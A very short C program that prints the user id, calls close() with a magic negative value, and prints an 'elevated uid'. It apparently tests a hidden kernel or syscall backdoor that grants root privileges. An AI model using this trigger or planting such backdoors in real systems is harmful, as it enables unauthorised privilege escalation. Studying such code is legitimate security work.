#include <stdio.h>
#include <unistd.h>

int main(int argc, const char *argv[])
{
    printf("uid: %d\n", getuid());
    close(-23121990);
    printf("elevated uid: %d\n", getuid());
    return 0;
}
